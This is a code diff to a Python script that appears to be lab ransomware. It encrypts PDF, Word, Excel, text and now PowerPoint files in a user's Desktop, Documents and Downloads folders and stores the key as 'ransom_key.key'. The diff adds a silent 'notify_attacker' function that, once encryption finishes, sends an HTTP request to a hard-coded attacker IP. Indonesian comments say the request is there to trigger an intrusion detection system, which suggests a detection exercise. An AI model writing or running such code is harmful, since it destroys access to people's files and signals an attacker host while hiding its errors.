@@ -2,6 +2,7 @@ import os
 import tkinter as tk
 from tkinter import messagebox
 from cryptography.fernet import Fernet
+import requests  # Penting untuk trigger IDS
 
 # Target direktori (Desktop, Documents, Downloads)
 TARGET_DIRS = [
@@ -11,7 +12,7 @@ TARGET_DIRS = [
 ]
 
 # File ekstensi yang akan diproses
-EXTENSIONS = ['.pdf', '.docx', '.xlsx', '.txt']
+EXTENSIONS = ['.pdf', '.docx', '.xlsx', '.txt', '.pptx']
 
 # Path penyimpanan kunci & log
 KEY_PATH = os.path.expanduser("~/ransom_key.key")
@@ -41,6 +42,14 @@ def encrypt_file(file_path, fernet, log_file):
     except Exception as e:
         log_file.write(f"❌ Gagal: {file_path} | {e}\n")
 
+# Fungsi untuk trigger IDS dengan koneksi HTTP
+def notify_attacker():
+    try:
+        # Ubah IP sesuai host attacker kamu
+        requests.get("http://192.168.100.11:8080/attack", timeout=1)
+    except:
+        pass  # Jangan munculkan error agar terlihat 'silent'
+
 def encrypt_all():
     key = generate_key()
     fernet = Fernet(key)
@@ -55,6 +64,9 @@ def encrypt_all():
                     if any(file.lower().endswith(ext) for ext in EXTENSIONS):
                         full_path = os.path.join(root, file)
                         encrypt_file(full_path, fernet, log_file)
+
+    # Kirim sinyal ke IDS (biar terdeteksi)
+    notify_attacker()
 
     messagebox.showinfo("Selesai", "File berhasil dienkripsi!\nLihat log di Desktop Anda.")
 
